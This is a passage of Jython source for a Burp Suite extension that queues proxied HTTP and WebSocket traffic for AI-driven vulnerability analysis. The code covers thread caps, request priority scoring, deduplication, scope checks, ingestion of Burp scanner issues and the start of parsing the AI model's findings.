                    self.updateStats("skipped_backpressure")
                    self.stderr.println("[THREAD CAP] Queue full (%d/%d), skipping: %s" % (
                        self._active_analysis_threads, cap, url_str[:60]))
                self._perf_debug(
                    "proxy queue rejected reason=%s priority=%d high_value=%s reasons=%s setup=%dms active_threads=%d cap=%d timings=%s url=%s" % (
                        skip_reason, int(priority_score), str(high_value), ",".join(priority_reasons[:5]),
                        self._perf_ms_since(queue_start),
                        int(getattr(self, "_active_analysis_threads", 0)), int(cap), str(timings), url_str[:120]),
                    key="proxy-queue-reject", min_interval=2.0)
                return False

            self._active_analysis_threads += 1
            if source != "PROXY":
                self.stdout.println("[THREAD] Counter incremented: %d/%d (%s)" % (self._active_analysis_threads, cap, source))
        task_id = self.addTask(source, url_str, "Queued", messageInfo, url_hash=url_hash)
        self._perf_debug(
            "proxy queue accepted task=%s priority=%d high_value=%s reasons=%s setup=%dms active_threads=%d cap=%d timings=%s url=%s" % (
                str(task_id), int(priority_score), str(high_value), ",".join(priority_reasons[:5]),
                self._perf_ms_since(queue_start),
                int(getattr(self, "_active_analysis_threads", 0)),
                int(cap),
                str(timings), url_str[:120]),
            key="proxy-queue-accepted", min_interval=1.0)
        if self.VERBOSE and source != "PROXY":
            self.stdout.println("[%s] Queued analysis: %s" % (source, url_str))
        t = threading.Thread(target=self.analyze, args=(messageInfo, url_str, task_id))
        t.setDaemon(True)
        t.start()
        return True

    def doPassiveScan(self, baseRequestResponse):
        # The checkbox is driven by processHttpMessage() on proxy responses.
        # This remains a no-op so the extension is not dependent on Burp Scanner.
        return None

    def doActiveScan(self, baseRequestResponse, insertionPoint):
        # Active scanning is not implemented in this extension.
        return []

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        return 0

    def newScanIssue(self, issue):
        """Ingest issues from Burp's built-in active/passive scanner into findings_list.

        Skips our own Double Agent issues to avoid double-counting. Maps Burp severity
        (High/Medium/Low/Information/False positive) and confidence (Certain/Firm/Tentative)
        directly. The first HTTP message attached to the issue is used for request/response data.
        """
        if not HAS_SCANNER_LISTENER:
            return
        try:
            issue_name = ""
            try:
                issue_name = str(issue.getIssueName() or "")
            except Exception:
                pass

            # Skip our own findings - they already came in via add_finding()
            if issue_name.startswith("(Double Agent)"):
                return

            # Skip false positives explicitly marked by user
            try:
                burp_severity = str(issue.getSeverity() or "")
            except Exception:
                burp_severity = ""
            if burp_severity == "False positive":
                return

            # Map Burp severity to our scale
            sev_map = {
                "High": "High",
                "Medium": "Medium",
                "Low": "Low",
                "Information": "Informational",
                "Informational": "Informational",
            }
            severity = sev_map.get(burp_severity, "Low")

            try:
                burp_confidence = str(issue.getConfidence() or "Tentative")
            except Exception:
                burp_confidence = "Tentative"

            try:
                url = str(issue.getUrl() or "")
            except Exception:
                url = ""
            if not url:
                return

            # Optional scope filter - only ingest in-scope (matches existing tool behaviour)
            try:
                if hasattr(self, "is_in_scope") and not self.is_in_scope(url):
                    return
            except Exception:
                pass

            try:
                detail = str(issue.getIssueDetail() or "")
            except Exception:
                detail = ""
            try:
                remediation = str(issue.getRemediationDetail() or "")
            except Exception:
                remediation = ""

            request_data = None
            response_data = None
            try:
                msgs = issue.getHttpMessages()
                if msgs and len(msgs) > 0:
                    msg = msgs[0]
                    req_bytes = msg.getRequest()
                    resp_bytes = msg.getResponse()
                    if req_bytes:
                        request_data = self.helpers.bytesToString(req_bytes)
                    if resp_bytes:
                        response_data = self.helpers.bytesToString(resp_bytes)
            except Exception:
                pass

            # Tag title so the source is obvious in the findings table
            tagged_title = "(Burp Scanner) " + issue_name if issue_name else "(Burp Scanner) Untitled issue"

            self.add_finding(
                url=url,
                title=tagged_title,
                severity=severity,
                confidence=burp_confidence,
                detail=detail,
                cwe="",
                evidence="",
                remediation=remediation,
                owasp="",
                ai_confidence=0,
                request_data=request_data,
                response_data=response_data,
                source="burp_scanner",
            )
        except Exception as e:
            try:
                self.stderr.println("[SCANNER LISTENER] Ingest error: %s" % self._safe_ascii_text(e))
            except Exception:
                pass

    def is_in_scope(self, url, log=True):
        try:
            from java.net import URL as JavaURL
            java_url = JavaURL(url)
            in_scope = self.callbacks.isInScope(java_url)

            if log and not in_scope:
                if self.VERBOSE:
                    self.stdout.println("[SCOPE] X OUT OF SCOPE: %s" % url)

            return in_scope

        except Exception as e:
            if log and self.VERBOSE:
                self.stderr.println("[!] Scope check error for %s: %s" % (url, self._safe_ascii_text(e)))
            return False

    def _annotate_recent_proxy_history(self, http_service, request_bytes, comment):
        """Set Burp's Proxy history comment on the most recent matching request."""
        if not comment:
            return False
        try:
            target_info = self.helpers.analyzeRequest(http_service, request_bytes)
            target_method = str(target_info.getMethod() or "")
            target_url = str(target_info.getUrl() or "")
        except Exception:
            target_method = ""
            target_url = ""

        try:
            history = self.callbacks.getProxyHistory() or []
        except Exception:
            return False

        for entry in reversed(list(history)[-200:]):
            try:
                service = entry.getHttpService()
                if service is None:
                    continue
                if str(service.getHost()).lower() != str(http_service.getHost()).lower():
                    continue
                if int(service.getPort()) != int(http_service.getPort()):
                    continue
                if str(service.getProtocol()).lower() != str(http_service.getProtocol()).lower():
                    continue

                entry_info = self.helpers.analyzeRequest(entry)
                if target_method and str(entry_info.getMethod() or "") != target_method:
                    continue
                if target_url and str(entry_info.getUrl() or "") != target_url:
                    continue

                existing = ""
                try:
                    existing = str(entry.getComment() or "")
                except:
                    existing = ""
                if existing and existing != comment:
                    entry.setComment(existing + " | " + comment)
                else:
                    entry.setComment(comment)
                return True
            except:
                continue
        return False

    def _apply_agent_note_header(self, messageInfo):
        """Move X-Double-Agent-Note into Burp's history comment and strip it upstream."""
        try:
            request_bytes = messageInfo.getRequest()
            if not request_bytes:
                return False

            req = self.helpers.analyzeRequest(messageInfo)
            headers = list(req.getHeaders())
            clean_headers = []
            note = ""
            header_name = "x-double-agent-note:"

            for header in headers:
                header_s = str(header)
                if header_s.lower().startswith(header_name):
                    note = header_s[len(header_name):].strip()
                    continue
                clean_headers.append(header)

            if not note:
                return False

            if len(note) > 250:
                note = note[:250]
            existing = ""
            try:
                existing = str(messageInfo.getComment() or "")
            except:
                existing = ""
            if existing and existing != note:
                messageInfo.setComment(existing + " | " + note)
            else:
                messageInfo.setComment(note)

            body = request_bytes[req.getBodyOffset():]
            messageInfo.setRequest(self.helpers.buildHttpMessage(clean_headers, body))
            if self.VERBOSE:
                self.stdout.println("[AGENT NOTE] Added Proxy history note and stripped X-Double-Agent-Note header")
            return True
        except Exception as e:
            try:
                self.stderr.println("[AGENT NOTE] Failed to apply note header: %s" % self._safe_ascii_text(e))
            except:
                pass
            return False

    def should_skip_extension(self, url):
        """Check if URL has a file extension that should be skipped (static files)"""
        try:
            # Get the path from URL, removing query string
            path = url.split('?')[0].lower()
            # Get the extension (last part after the final dot in the filename)
            if '/' in path:
                filename = path.split('/')[-1]
            else:
                filename = path
            if '.' in filename:
                ext = filename.split('.')[-1]
                # Check against set of skip extensions (converted to set for faster lookup)
                skip_exts = set(self.SKIP_EXTENSIONS)
                if ext in skip_exts:
                    if self.VERBOSE:
                        self.stdout.println("[SKIP] Static file extension: .%s - %s" % (ext, url[:80]))
                    return True
                # Also check common case variations
                if ext.lower() in skip_exts:
                    if self.VERBOSE:
                        self.stdout.println("[SKIP] Static file extension (lowercase): .%s - %s" % (ext, url[:80]))
                    return True
            return False
        except Exception as e:
            if self.VERBOSE:
                self.stderr.println("[SKIP] Extension check error: %s" % self._safe_ascii_text(e))
            return False

    def _url_extension(self, url):
        try:
            path = str(url or "").split("?", 1)[0].lower()
            filename = path.rsplit("/", 1)[-1]
            if "." not in filename:
                return ""
            return filename.rsplit(".", 1)[-1]
        except:
            return ""

    def _is_javascript_url(self, url):
        ext = self._url_extension(url)
        if ext in ("js", "mjs", "cjs"):
            return True
        path = str(url or "").split("?", 1)[0].lower()
        return path.endswith(".chunk.js") or path.endswith(".bundle.js") or path.endswith("/remoteentry.js")

    def _passive_request_priority(self, req, url_str, messageInfo=None):
        """Score proxy traffic so high-signal requests are not dropped by coarse intake throttles."""
        score = 0
        reasons = []
        try:
            method = str(req.getMethod() or "").upper()
        except:
            method = ""
        url_l = str(url_str or "").lower()
        path_l = url_l.split("?", 1)[0]

        if method not in ("", "GET", "HEAD", "OPTIONS"):
            score += 2
            reasons.append("method:%s" % method)

        high_value_markers = [
            "/api/", "/graphql", "/auth", "/login", "/logout", "/session", "/sessions",
            "/token", "/oauth", "/sso", "/mfa", "/member", "/members", "/account",
            "/user", "/users", "/profile", "/policy", "/claim", "/claims", "/payment",
            "/billing", "/admin", "/preferences", "/personalisedcontent"
        ]
        for marker in high_value_markers:
            if marker in path_l:
                score += 2
                reasons.append("path:%s" % marker)
                break

        if self._is_javascript_url(url_str):
            score += 1
            reasons.append("javascript")

        try:
            params = req.getParameters()
            non_cookie_params = 0
            for p in params:
                try:
                    if int(p.getType()) != 2:
                        non_cookie_params += 1
                except:
                    non_cookie_params += 1
            if non_cookie_params > 0:
                score += 1
                reasons.append("params:%d" % non_cookie_params)
        except:
            pass

        try:
            headers_l = "\n".join([str(h).lower() for h in req.getHeaders()])
            if ("authorization:" in headers_l or "cookie:" in headers_l or
                    "x-api" in headers_l or "x-auth" in headers_l or "csrf" in headers_l):
                score += 1
                reasons.append("auth_headers")
            if ("content-type:" in headers_l and
                    ("json" in headers_l or "x-www-form-urlencoded" in headers_l or "graphql" in headers_l)):
                score += 1
                reasons.append("structured_body")
        except:
            pass

        try:
            if messageInfo is not None and messageInfo.getResponse() is not None:
                res = self.helpers.analyzeResponse(messageInfo.getResponse())
                status = int(res.getStatusCode())
                if status in (401, 403, 404, 409, 429, 500):
                    score += 1
                    reasons.append("status:%d" % status)
                response_headers_l = "\n".join([str(h).lower() for h in res.getHeaders()[:20]])
                if "application/json" in response_headers_l or "graphql" in response_headers_l:
                    score += 1
                    reasons.append("json_response")
        except:
            pass

        try:
            if score > 10:
                score = 10
        except:
            pass
        return score, reasons
    
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        listener_start = time.time()
        is_proxy = False
        try:
            is_proxy = (int(toolFlag) == int(self.callbacks.TOOL_PROXY))
        except Exception:
            is_proxy = False

        if messageIsRequest:
            try:
                req = self.helpers.analyzeRequest(messageInfo)
                url_str = str(req.getUrl())
                if "127.0.0.1:8777" in url_str or "localhost:8777" in url_str:
                    # Add comment to identify Agent API requests
                    current = messageInfo.getComment()
                    if not current:
                        messageInfo.setComment("Agent API")
            except:
                pass
            if is_proxy:
                self._apply_agent_note_header(messageInfo)
            elapsed_ms = self._perf_ms_since(listener_start)
            if elapsed_ms > int(getattr(self, "PERF_DEBUG_SLOW_MS", 75)):
                self._perf_debug("listener request slow=%dms proxy=%s" % (elapsed_ms, str(is_proxy)), key="listener-request-slow", min_interval=1.0)
            return

        if not is_proxy:
            return

        self._http_listener_count += 1
        if self._http_listener_count % 50 == 0:
            self._perf_debug(
                "listener saw %d proxy responses | %s" % (int(self._http_listener_count), self._perf_counts_snapshot()),
                key="listener-count", min_interval=5.0)
        self._queue_proxy_traffic_analysis(messageInfo, "PROXY")
        elapsed_ms = self._perf_ms_since(listener_start)
        if elapsed_ms > int(getattr(self, "PERF_DEBUG_SLOW_MS", 75)):
            self._perf_debug("listener response slow=%dms | %s" % (elapsed_ms, self._perf_counts_snapshot()), key="listener-response-slow", min_interval=1.0)

    def processWebSocketMessage(self, toolFlag, messageIsRequest, message):
        """Capture WebSocket messages for AI analysis.
        
        Called by Burp for every WebSocket message sent or received.
        Messages are queued for the agent to analyze for injection points,
        auth issues, and data leakage.
        """
        try:
            if not self.PASSIVE_SCANNING_ENABLED:
                return

            direction = message.getDirection()
            direction_str = "client-to-server" if direction == message.DIRECTION_CLIENT_TO_SERVER else "server-to-client"
            payload = message.getPayload()
            if not payload or len(payload) == 0:
                return

            # Decode payload
            try:
                payload_str = self.helpers.bytesToString(payload)
            except:
                payload_str = "[binary payload: %d bytes]" % len(payload)

            # Skip empty or trivial messages
            if not payload_str or len(payload_str.strip()) < 2:
                return

            # Get WebSocket annotations for URL context
            ws_url = ""
            try:
                annotations = message.getAnnotations()
                if annotations:
                    ws_url = str(annotations.getUrl() if hasattr(annotations, 'getUrl') else "")
            except:
                pass

            if self.VERBOSE:
                self.stdout.println("[WS] %s | %s | %s" % (direction_str, ws_url[:60], payload_str[:100]))

            # Queue for agent analysis
            self._sendWebSocketToAgent(message, direction_str, payload_str, ws_url)

        except Exception as e:
            if self.VERBOSE:
                self.stderr.println("[WS] Error: %s" % self._safe_ascii_text(e))

    def _sendWebSocketToAgent(self, message, direction_str, payload_str, ws_url):
        """Queue a WebSocket message for the agent to analyze."""
        try:
            if self.agent_server is None:
                return

            with self.agent_queue_lock:
                if len(self.agent_queue) >= self.MAX_AGENT_QUEUE_SIZE:
                    return

                qid = self.agent_queue_next_id
                self.agent_queue_next_id += 1

                summary = "WS %s: %s" % (direction_str, payload_str[:60])

                queue_item = {
                    "id": qid,
                    "status": "pending",
                    "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "claimed_at": None,
                    "completed_at": None,
                    "summary": summary,
                    "assessment": "",
                    "test_results": [],
                    "notes": [],
                    "source": "websocket",
                    "browser_verify": False,
                    "user_context": "",
                    "finding_ids": [],
                    # WebSocket-specific data
                    "ws_direction": direction_str,
                    "ws_url": ws_url,
                    "ws_payload": payload_str[:10240],
                    "ws_payload_length": len(payload_str)
                }
                self.agent_queue.append(queue_item)
                self.selected_agent_queue_index = len(self.agent_queue) - 1

            self.save_agent_queue()
            if self.VERBOSE:
                self.stdout.println("[WS] Queued for agent: %s" % summary)

        except Exception as e:
            if self.VERBOSE:
                self.stderr.println("[WS] Queue error: %s" % self._safe_ascii_text(e))

    def analyze(self, messageInfo, url_str=None, task_id=None):
        worker_wait_start = time.time()
        self.semaphore.acquire()
        worker_wait_ms = self._perf_ms_since(worker_wait_start)
        task_type_for_debug = self._task_type_for_id(task_id)
        if worker_wait_ms > int(getattr(self, "PERF_DEBUG_SLOW_MS", 75)) or task_type_for_debug == "PROXY":
            self._perf_debug(
                "analysis worker acquired task=%s type=%s wait=%dms active_threads=%d url=%s" % (
                    str(task_id), task_type_for_debug, worker_wait_ms,
                    int(getattr(self, "_active_analysis_threads", 0)), str(url_str or "")[:120]),
                key="analysis-worker-acquired" if task_type_for_debug == "PROXY" else "analysis-worker-slow",
                min_interval=1.0 if task_type_for_debug == "PROXY" else 0.0)
        try:
            try:
                if not self._wait_if_paused_or_cancelled(task_id):
                    if task_id is not None:
                        self.updateTask(task_id, "Cancelled")
                    return

                with self.rate_limit_lock:
                    time_since_last = time.time() - self.last_request_time
                    if time_since_last < self.min_delay:
                        wait_time = self.min_delay - time_since_last
                        if task_id is not None:
                            self.updateTask(task_id, "Waiting (Rate Limit)")
                        self._perf_debug(
                            "analysis rate wait task=%s type=%s wait=%.2fs url=%s" % (
                                str(task_id), self._task_type_for_id(task_id), wait_time, str(url_str or "")[:120]),
                            key="analysis-rate-wait", min_interval=1.0)
                        if not self._interruptible_sleep(wait_time, task_id):
                            if task_id is not None:
                                self.updateTask(task_id, "Cancelled")
                            return
                    self.last_request_time = time.time()
                if task_id is not None:
                    if self._is_task_cancelled(task_id):
                        self.updateTask(task_id, "Cancelled")
                        return
                    self.updateTask(task_id, "Analyzing")
                
                self._perform_analysis(messageInfo, "HTTP", url_str, task_id)
                
                if task_id is not None:
                    if self._is_task_cancelled(task_id):
                        self.updateTask(task_id, "Cancelled")
                    else:
                        with self.tasks_lock:
                            current_status = self.tasks[task_id].get("status", "") if task_id < len(self.tasks) else "Cancelled"
                        if not self._is_terminal_status(current_status):
                            self.updateTask(task_id, "Completed")
            except Exception as e:
                if task_id is not None and self._is_task_cancelled(task_id):
                    self.updateTask(task_id, "Cancelled")
                else:
                    self.stderr.println("[!] HTTP error: %s" % self._safe_ascii_text(e))
                    if task_id is not None:
                        self.updateTask(task_id, "Error: %s" % self._safe_ascii_text(e, 30))
                    self.updateStats("errors")
            finally:
                task_type = self._task_type_for_id(task_id)
                with self._analysis_thread_lock:
                    old_count = self._active_analysis_threads
                    self._active_analysis_threads = max(0, self._active_analysis_threads - 1)
                    if old_count != self._active_analysis_threads and task_type != "PROXY":
                        self.stdout.println("[THREAD] Counter decremented: %d -> %d (analyze)" % (old_count, self._active_analysis_threads))
                self._release_task_url_hash(task_id)
                if task_type == "PROXY" and getattr(self, "PROXY_UI_LAZY_REFRESH", True):
                    self._ui_dirty = True
                else:
                    self.refreshUI()
        finally:
            try:
                self.semaphore.release()
            except:
                pass

    def analyze_forced(self, messageInfo, url_str=None, task_id=None):
        """
        Forced analysis that bypasses deduplication.
        Used for context menu re-analysis of already-analyzed requests.
        """
        # Skip static file extensions even for forced analysis
        if url_str and self.should_skip_extension(url_str):
            if self.VERBOSE:
                self.stdout.println("[FORCE SKIP] Static file: %s" % url_str[:80])
            if task_id is not None:
                self.updateTask(task_id, "Skipped (Static File)")
            return

        # Skip static asset paths (bundler output, fonts, sourcemaps) that will never yield findings
        if url_str:
            _path_lower = url_str.lower().split("?")[0]
            _static_path_markers = [
                "/_next/static/", "/static/chunks/", "/static/media/",
                "/__webpack", "/.nuxt/", "/dist/static/", "/assets/static/",
                ".chunk.js", ".bundle.js", "-manifest.json", "/_buildmanifest",
                "/_ssgmanifest", "/webpack-runtime", "/runtime~main"
            ]
            if any(m in _path_lower for m in _static_path_markers):
                if self.VERBOSE:
                    self.stdout.println("[FORCE SKIP] Static asset path: %s" % url_str[:80])
                if task_id is not None:
                    self.updateTask(task_id, "Skipped (Static Asset)")
                return
            
        with self.semaphore:
            try:
                if not self._wait_if_paused_or_cancelled(task_id):
                    if task_id is not None:
                        self.updateTask(task_id, "Cancelled")
                    return

                with self.rate_limit_lock:
                    time_since_last = time.time() - self.last_request_time
                    if time_since_last < self.min_delay:
                        wait_time = self.min_delay - time_since_last
                        if task_id is not None:
                            self.updateTask(task_id, "Waiting (Rate Limit)")
                        if not self._interruptible_sleep(wait_time, task_id):
                            if task_id is not None:
                                self.updateTask(task_id, "Cancelled")
                            return
                    self.last_request_time = time.time()
                if task_id is not None:
                    if self._is_task_cancelled(task_id):
                        self.updateTask(task_id, "Cancelled")
                        return
                    self.updateTask(task_id, "Analyzing (Forced)")
                
                # Call _perform_analysis with bypass_dedup=True
                self._perform_analysis(messageInfo, "CONTEXT", url_str, task_id, bypass_dedup=True)
                
                if task_id is not None:
                    if self._is_task_cancelled(task_id):
                        self.updateTask(task_id, "Cancelled")
                    else:
                        with self.tasks_lock:
                            current_status = self.tasks[task_id].get("status", "") if task_id < len(self.tasks) else "Cancelled"
                        if not self._is_terminal_status(current_status):
                            self.updateTask(task_id, "Completed")
            except Exception as e:
                if task_id is not None and self._is_task_cancelled(task_id):
                    self.updateTask(task_id, "Cancelled")
                else:
                    self.stderr.println("[!] Context menu error: %s" % self._safe_ascii_text(e))
                    if task_id is not None:
                        self.updateTask(task_id, "Error: %s" % self._safe_ascii_text(e, 30))
                    self.updateStats("errors")
            finally:
                with self._analysis_thread_lock:
                    old_count = self._active_analysis_threads
                    self._active_analysis_threads = max(0, self._active_analysis_threads - 1)
                    if old_count != self._active_analysis_threads:
                        self.stdout.println("[THREAD] Counter decremented: %d -> %d (analyze_forced)" % (old_count, self._active_analysis_threads))
                self._release_task_url_hash(task_id)
                self.refreshUI()

    def _get_raw_url_hash(self, url, params, req=None, request_bytes=None):
        method = ""
        try:
            method = req.getMethod()
        except:
            pass
        body_component = ""
        try:
            method_u = str(method or "").upper()
            if request_bytes is not None and method_u not in ("GET", "HEAD", "OPTIONS"):
                body_offset = req.getBodyOffset() if req is not None else 0
                body_bytes = request_bytes[body_offset:]
                if body_bytes:
                    try:
                        body_text = self.helpers.bytesToString(body_bytes)
                    except:
                        body_text = str(body_bytes)
                    body_text = str(body_text or "").strip()
                    if body_text:
                        if len(body_text) > 8192:
                            body_text = body_text[:8192]
                        try:
                            body_component = hashlib.md5(body_text.encode('utf-8')).hexdigest()
                        except:
                            body_component = hashlib.md5(body_text.encode('ascii', 'replace')).hexdigest()
        except:
            body_component = ""
        normalized_url = self._canonicalize_url_for_scan_cache(url)
        normalized = str(method or "") + "|" + str(normalized_url) + "|body:" + str(body_component)
        try:
            return hashlib.md5(normalized.encode('utf-8')).hexdigest()
        except (UnicodeDecodeError, UnicodeEncodeError):
            return hashlib.md5(normalized.encode('ascii', 'replace')).hexdigest()

    def _get_finding_hash(self, url, title, cwe, param_name=""):
        key = "%s|%s|%s|%s" % (str(url).split('?')[0], title.lower().strip(), cwe, param_name)
        return hashlib.md5(key.encode('utf-8')).hexdigest()

    def _perform_analysis(self, messageInfo, source, url_str=None, task_id=None, bypass_dedup=False):
        analysis_start = time.time()
        phase_timings = []
        task_type_for_debug = self._task_type_for_id(task_id)
        prompt_text = ""
        prompt_chars = 0
        prompt_tokens = 0
        prompt_ms = 0
        ai_gate_wait_ms = 0
        ai_ms = 0
        ai_chars = 0
        parse_ms = 0
        build_data_ms = 0
        finding_loop_ms = 0
        repair_mode = "not_started"
        findings_count = 0
        url_hash = ""
        try:
            phase_start = time.time()
            req = self.helpers.analyzeRequest(messageInfo)
            res = self.helpers.analyzeResponse(messageInfo.getResponse())
            url = str(req.getUrl())
            phase_timings.append(("helpers", self._perf_ms_since(phase_start)))
            
            if not url_str:
                url_str = url
            
            # Skip OPTIONS requests (CORS preflight) - they don't carry authorization by design
            method = req.getMethod()
            if method == "OPTIONS":
                if self.VERBOSE:
                    self.stdout.println("[%s] URL: %s - [SKIP] OPTIONS request (CORS preflight)" % (source, url_str))
                if task_id is not None:
                    self.updateTask(task_id, "Skipped (OPTIONS Request)")
                self.updateStats("skipped_duplicate")
                self._perf_debug(
                    "analysis skip OPTIONS task=%s type=%s total=%dms url=%s" % (
                        str(task_id), task_type_for_debug, self._perf_ms_since(analysis_start), str(url_str)[:120]),
                    key="analysis-skip-options", min_interval=2.0)
                return
            
            phase_start = time.time()
            params = req.getParameters()
            url_hash = self._get_raw_url_hash(url, params, req, messageInfo.getRequest())
            track_passive_cache = (source == "HTTP" and not bypass_dedup and getattr(self, "PROXY_DEDUPE_ENABLED", True))
            
            # Check deduplication unless bypass requested (e.g., context menu)
            effective_bypass_dedup = bypass_dedup or (source == "HTTP" and not getattr(self, "PROXY_DEDUPE_ENABLED", True))
            if not effective_bypass_dedup:
                already_analyzed = False
                with self.url_lock:
                    already_analyzed = self._recent_completed_scan_locked(url_hash)
                if already_analyzed:
                    if self.VERBOSE:
                        self.stdout.println("[%s] URL: %s - [SKIP] Already analyzed (within %d min window)" % (source, url_str, self.PROCESSED_URL_EXPIRY_SECONDS / 60))
                    if task_id is not None:
                        self.updateTask(task_id, "Skipped (Already Analyzed)")
                    self.updateStats("skipped_duplicate")
                    phase_timings.append(("dedupe", self._perf_ms_since(phase_start)))
                    self._perf_debug(
                        "analysis skip duplicate task=%s type=%s total=%dms phases=%s url=%s" % (
                            str(task_id), task_type_for_debug, self._perf_ms_since(analysis_start),
                            str(phase_timings), str(url_str)[:120]),
                        key="analysis-skip-duplicate", min_interval=2.0)
                    return
            else:
                # Context menu re-analysis - force fresh analysis
                if self.VERBOSE and bypass_dedup:
                    self.stdout.println("[%s] URL: %s - [FORCE] Bypassing deduplication" % (source, url_str))
            phase_timings.append(("dedupe", self._perf_ms_since(phase_start)))

            phase_start = time.time()
            request_bytes = messageInfo.getRequest()
            try:
                # Use Burp's helper for safe string conversion
                req_body = self.helpers.bytesToString(request_bytes[req.getBodyOffset():])[:2000]
                # Store full request for agent
                request_data_full = self._bytes_to_str(request_bytes)
                if request_data_full and len(request_data_full) > 10240:
                    request_data_full = request_data_full[:10240] + "... [truncated]"
            except Exception as e:
                if self.VERBOSE:
                    self.stdout.println("[DEBUG] Request body decode error: %s" % self._safe_ascii_text(e))
                req_body = "[Binary/non-UTF8 content]"
                request_data_full = None

            req_headers = [str(h) for h in req.getHeaders()[:10]]
            phase_timings.append(("request_extract", self._perf_ms_since(phase_start)))

            phase_start = time.time()
            response_bytes = messageInfo.getResponse()
            try:
                # Use Burp's helper for safe string conversion
                res_body = self.helpers.bytesToString(response_bytes[res.getBodyOffset():])[:3000]
                # Store full response for agent
                response_data_full = self._bytes_to_str(response_bytes)
                if response_data_full and len(response_data_full) > 10240:
                    response_data_full = response_data_full[:10240] + "... [truncated]"
            except Exception as e:
                if self.VERBOSE:
                    self.stdout.println("[DEBUG] Response body decode error: %s" % self._safe_ascii_text(e))
                res_body = "[Binary/non-UTF8 content]"
                response_data_full = None
            
            res_headers = [str(h) for h in res.getHeaders()[:10]]
            phase_timings.append(("response_extract", self._perf_ms_since(phase_start)))

            phase_start = time.time()
            params_sample = [{"name": p.getName(), "value": p.getValue()[:150], 
                            "type": str(p.getType())} for p in params[:5]]
            phase_timings.append(("params_sample", self._perf_ms_since(phase_start)))

            phase_start = time.time()
            data = self.build_enriched_data(messageInfo, url_str, task_id)
            build_data_ms = self._perf_ms_since(phase_start)
            phase_timings.append(("build_enriched_data", build_data_ms))
            self._perf_debug(
                "analysis data built task=%s type=%s build_data=%dms req_body=%d res_body=%d params=%d url=%s" % (
                    str(task_id), task_type_for_debug, build_data_ms,
                    len(str(req_body or "")), len(str(res_body or "")),
                    len(params_sample), str(url_str)[:120]),
                key="analysis-data-built" if task_type_for_debug == "PROXY" else "analysis-data-built-other",
                min_interval=1.0 if task_type_for_debug == "PROXY" else 2.0)
            if self.VERBOSE:
                self.stdout.println("[%s] Analyzing request..." % source)

            phase_start = time.time()
            prompt_text = self.build_prompt(data)
            prompt_ms = self._perf_ms_since(phase_start)
            prompt_chars = len(str(prompt_text or ""))
            try:
                prompt_tokens = self._estimate_token_count(prompt_text)
            except:
                prompt_tokens = int(prompt_chars / 4)
            phase_timings.append(("build_prompt", prompt_ms))
            self._perf_debug(
                "analysis prompt task=%s type=%s prompt_ms=%dms prompt_chars=%d est_tokens=%d url=%s" % (
                    str(task_id), task_type_for_debug, prompt_ms, prompt_chars, prompt_tokens, str(url_str)[:120]),
                key="analysis-prompt" if task_type_for_debug == "PROXY" else "analysis-prompt-other",
                min_interval=1.0 if task_type_for_debug == "PROXY" else 2.0)

            gate = getattr(self, "_ai_request_semaphore", None)
            gate_acquired = False
            gate_start = time.time()
            try:
                if gate is not None:
                    if task_id is not None:
                        self.updateTask(task_id, "Waiting (AI Slot)")
                    gate.acquire()
                    gate_acquired = True
                    ai_gate_wait_ms = self._perf_ms_since(gate_start)
                    phase_timings.append(("ai_gate_wait", ai_gate_wait_ms))
                    self._perf_debug(
                        "analysis ai gate acquired task=%s type=%s wait=%dms concurrency=%d url=%s" % (
                            str(task_id), task_type_for_debug, ai_gate_wait_ms,
                            int(getattr(self, "AI_REQUEST_CONCURRENCY", 1)), str(url_str)[:120]),
                        key="analysis-ai-gate" if task_type_for_debug == "PROXY" else "analysis-ai-gate-other",
                        min_interval=1.0 if task_type_for_debug == "PROXY" else 2.0,
                        force=(ai_gate_wait_ms > int(getattr(self, "PERF_DEBUG_SLOW_MS", 75))))
                if task_id is not None:
                    self.updateTask(task_id, "Analyzing")
                phase_start = time.time()
                ai_text = self.ask_ai(prompt_text)
                ai_ms = self._perf_ms_since(phase_start)
            finally:
                if gate_acquired:
                    try:
                        gate.release()
                    except:
                        pass
            ai_chars = len(str(ai_text or ""))
            phase_timings.append(("ask_ai", ai_ms))
            self._perf_debug(
                "analysis ai returned task=%s type=%s gate_wait=%dms ai_ms=%dms response_chars=%d url=%s" % (
                    str(task_id), task_type_for_debug, ai_gate_wait_ms, ai_ms, ai_chars, str(url_str)[:120]),
                key="analysis-ai-returned" if task_type_for_debug == "PROXY" else "analysis-ai-returned-other",
                min_interval=1.0 if task_type_for_debug == "PROXY" else 2.0,
                force=(ai_ms > int(getattr(self, "PERF_DEBUG_SLOW_MS", 75))))
            
            if not ai_text:
                ai_error = self._get_last_ai_error()
                status = "Error (No AI Response)"
                if "timed out" in ai_error.lower() or "timeout" in ai_error.lower():
                    status = "Error (AI Timeout)"
                if self.VERBOSE:
                    if ai_error:
                        self.stdout.println("[%s] [ERROR] %s: %s" % (source, status, self._safe_ascii_text(ai_error, 300)))
                    else:
                        self.stdout.println("[%s] [ERROR] No AI response" % source)
                if task_id is not None:
                    self.updateTask(task_id, status, ai_error)
                self.updateStats("errors")
                if track_passive_cache:
                    self._record_passive_scan_failure(url_hash, url_str, status, ai_error)
                self._perf_debug(
                    "analysis abort no_ai task=%s type=%s status=%s gate_wait=%dms total=%dms ai_error=%s phases=%s url=%s" % (
                        str(task_id), task_type_for_debug, status, ai_gate_wait_ms,
                        self._perf_ms_since(analysis_start), self._safe_ascii_text(ai_error, 300),
                        str(phase_timings), str(url_str)[:120]),
                    force=True)
                return

            # DEBUG: Log raw AI response
            if self.VERBOSE:
                self.stdout.println("[%s] [AI RAW RESPONSE] %s" % (source, self._safe_ascii_text(ai_text[:2000])))

            self.updateStats("analyzed")

            parse_start = time.time()
            ai_text = ai_text.strip()
            original_text = ai_text
            repair_mode = "none"
            
            if ai_text.startswith("```"):
                import re
                ai_text = re.sub(r'^```(?:json)?\n?|```$', '', ai_text, flags=re.MULTILINE).strip()
            
            start = ai_text.find('[')
            end = ai_text.rfind(']')
            if start != -1 and end != -1:
                ai_text = ai_text[start:end + 1]
            elif ai_text.find('{') != -1:
                obj_start = ai_text.find('{')
                obj_end = ai_text.rfind('}')
                if obj_start != -1 and obj_end != -1:
                    ai_text = '[' + ai_text[obj_start:obj_end + 1] + ']'

            ai_text = self._sanitize_ai_json_text(ai_text)
            ai_text = self._truncate_oversized_json_string_values(ai_text, max_chars=1800)

            try:
                findings = self._coerce_ai_findings(json.loads(ai_text))
            except ValueError as e:
                repair_mode = "line_repair"
